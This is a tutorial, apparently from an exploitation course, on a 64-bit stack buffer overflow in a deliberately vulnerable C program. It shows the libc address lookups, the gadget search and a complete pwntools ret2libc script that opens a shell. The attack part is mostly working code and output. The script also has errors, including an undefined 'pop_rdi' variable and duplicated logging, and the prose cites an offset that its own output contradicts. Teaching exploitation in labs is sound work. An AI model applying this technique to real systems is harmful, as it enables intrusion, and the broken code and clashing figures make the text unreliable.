
# 64-bit Exploit Explanation

This exercise illustrates how exploitation is performed in a 64-bit environment.
Important: ASLR will be disabled. In the format string exercise (the challenge), ASLR will be enabled and we will see how to bypass it.

## Source Code

The source code is:

```c
#include<stdio.h> 
#include<string.h> 

void vuln(char *cadena)
{ 
  char buf[100]; 
  strcpy(buf,cadena); 
  printf("Input was: %s\n",buf); 
}
void main(int argc, char *argv[]) 
{
  vuln(argv[1]);
}
```




#### Vulnerability Analysis

The vulnerability is a typical buffer overflow. We need to find the offset. The offset is 120 bytes.



#### Searching for Addresses in libc

We need to find the addresses to execute `system ("/bin/sh")`. Since our executable does not contain the call, we inspect libc:

```bash
# ldd vuln
        linux-vdso.so.1 (0x00007ffff7ffd000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7e14000)
        /lib64/ld-linux-x86-64.so.2 (0x0000555555554000)


# objdump -M intel -d /lib/x86_64-linux-gnu/libc.so.6 > dump  # Dump the disassembly (Intel format) into the file dump

# strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh  # Search for /bin/sh and find it at offset 0x183cee

 1a7e43 /bin/sh
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/bufferoverflow/exercises/stackOverflow/x64]
└─$ cat dump | grep system        
00000000000528f0 <__libc_system@@GLIBC_PRIVATE>:
   528f3:       74 0b                   je     52900 <__libc_system@@GLIBC_PRIVATE+0x10>
0000000000156030 <svcerr_systemerr@GLIBC_2.2.5>:
  156087:       75 05                   jne    15608e <svcerr_systemerr@GLIBC_2.2.5+0x5e>

```

We note the following offsets:

`system:  0x528f0`

`/bin/sh: 0x1a7e43`

Now we add these offsets to the base address where LIBC is loaded (we check it with gdb, since it will not change because ASLR is disabled):

```
root@kali:~/bufferOverflow/stackOverflow/x64# gdb -q vuln
Reading symbols from vuln...done.
gef➤ b main 
Breakpoint 1 at 0x1154: file vuln.c, line 7.
gef➤ run
gef➤  vmmap
[ Legend:  Code | Stack | Heap ]
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /home/kali/bufferoverflow/exercises/stackOverflow/x64/vuln
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /home/kali/bufferoverflow/exercises/stackOverflow/x64/vuln
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /home/kali/bufferoverflow/exercises/stackOverflow/x64/vuln
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /home/kali/bufferoverflow/exercises/stackOverflow/x64/vuln
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /home/kali/bufferoverflow/exercises/stackOverflow/x64/vuln
0x00007ffff7daf000 0x00007ffff7db2000 0x0000000000000000 rw- 
0x00007ffff7db2000 0x00007ffff7dda000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7dda000 0x00007ffff7f3f000 0x0000000000028000 r-x /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7f3f000 0x00007ffff7f95000 0x000000000018d000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7f95000 0x00007ffff7f99000 0x00000000001e2000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7f99000 0x00007ffff7f9b000 0x00000000001e6000 rw- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7f9b000 0x00007ffff7fa8000 0x0000000000000000 rw- 
0x00007ffff7fc0000 0x00007ffff7fc2000 0x0000000000000000 rw- 
0x00007ffff7fc2000 0x00007ffff7fc6000 0x0000000000000000 r-- [vvar]
0x00007ffff7fc6000 0x00007ffff7fc8000 0x0000000000000000 r-x [vdso]
0x00007ffff7fc8000 0x00007ffff7fc9000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7fc9000 0x00007ffff7ff0000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7ff0000 0x00007ffff7ffb000 0x0000000000028000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7ffb000 0x00007ffff7ffd000 0x0000000000033000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000035000 rw- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]

```


Libc load address:

`libc_base = 0x00007ffff7db2000`

### Finding a Gadget

Finally, we need to find a gadget to load the appropriate parameter into RDI for calling `system`.

Let's use ropper (it's in the install script in the repository):

Now we search for gadgets that are useful for loading the value of `/bin/sh` into RDI:

```
┌──(kali㉿kali)-[~/bufferoverflow/exercises/stackOverflow/x64]
└─$ ropper --file libc.so.6 --nocolor | grep ret | grep -E "pop rdi; ret"                                  
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
0x000000000002a205: pop rdi; ret;
```

Therefore, we have the offset of the gadget we are looking for:

`offset_pop_rdi = 0x2a205`

### Exploit Development

```python
#!/usr/bin/python
# coding: utf-8

from pwn import *

# Definition of addresses (see above)
libc_base = 0x00007ffff7db2000
system_addr = libc_base + 0x528f0
binsh_addr = libc_base + 0x1a7e43
pop_rdi_ret = libc_base + 0x2a205
ret = libc_base + 0x2a206

log.info("system: " + str(hex(system_addr)))
log.info("binsh: " + str(hex(binsh_addr)))
log.info("pop_rdi: " + str(hex(pop_rdi)))
pause()

log.info ("system: " + str(hex(system_addr)))
log.info ("binsh: " + str(hex(binsh_addr)))
log.info ("pop_rdi_ret: " + str(hex(pop_rdi_ret)))

pause()

p = process ("./vuln")

payload = b""
payload += b"A"*120
# Some functions (e.g., moveaps) require RSP to be aligned to 16 bits. For this reason, since 120 "A"s mean
# that RSP is not aligned to 16 bits (missing 8 bits --> 120/16 = 7.5), here we add a ret instruction
# (which takes 8 bits), so that the stack is aligned to 16 bits (last byte is 0 when calling system)
payload += p64 (ret) 
payload += p64(pop_rdi_ret)
payload += p64(binsh_addr)
payload += p64(system_addr)
	
log.info ("Sending payload...")

p.sendline(payload)
p.recv()
p.interactive()
```

